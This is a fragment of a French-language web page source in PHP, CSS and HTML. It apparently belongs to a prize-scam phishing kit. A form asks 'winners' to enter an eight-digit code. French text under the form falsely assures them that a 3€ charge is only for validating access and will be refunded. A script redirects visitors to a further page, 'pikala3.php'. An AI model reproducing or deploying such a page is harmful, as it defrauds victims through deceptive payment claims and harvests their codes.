...
{	
    ...
    echo "<script> window.location.href = 'pikala3.php'; </script>"; 
...
#container3 .row{background-color:transparent;   padding:0%; margin:0%;    display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center; flex-wrap:wrap; flex-direction: row; }       
            ...
            #container3 .col1b{background-color:transparent; padding:0%; margin:0% 2%;  display:grid; align-items:center; justify-content:center; text-align:center;    }
               #container3 .postext1{  margin:2% 3%; display:flex; align-items:center; justify-items:center; justify-content:center; text-align:center;}  #container3 .text1{color:white; font:800 30px 'cairo'; line-height: 30px; }
			   #container3 .posform{ margin:2% 0% ;  display:flex; align-items:center; justify-content:center; text-align:center;}  
			   #container3 form{background-color:red; width:400px; padding:20px; }
...
{ 
   #container3 .text1{color:white; font:800 20px 'cairo'; line-height: 30px; }
   #container3 .posform{ margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  
   #container3 form{background-color:red; width:320px; padding:10px;   }
		#container3 .posinput{ margin:2% 0%; display:flex; align-items:center; justify-content:center; text-align:center;}   
...
<div id="container3"> <div class="row">			
	<div class="col1a">  <div class="col1b">
        ...
        <div class="posform">
		   <form method="post"  > 
		       <div class="posinput"> <input type="text"   placeholder="Tapez votre code"  value=""          name="code"       class="inputtext"   required="required"  oninvalid="this.setCustomValidity('Vous devez entrer votre code ')"       oninput="setCustomValidity('')"    title="Vous devez entrer 8 chiffres" pattern="[0-8]{0}[0-9]{8}"   />  </div>  
               <div class="posinput"> <input type="submit" placeholder=""                         value="ENVOYER"   name="sendinfo"   class="inputsubmit"  />  </div>			   
 		       <div class="postext2">  <div class="text2"> Nous vous tenons informés que le prix 3€ demandé n'est pas prélevé définitivement de votre budget sera remboursé car nous avons déjà payé les frais de l'opération, c'est juste pour valider votre accès. D'ailleurs, nous sommes engagés avec tous les opérateurs pour que les appels de nos gagnants soient gratuits, pour tout frais notre équipe qui sera chargée de son paiement  </div>  </div>
           </form> 			   
        </div> 	
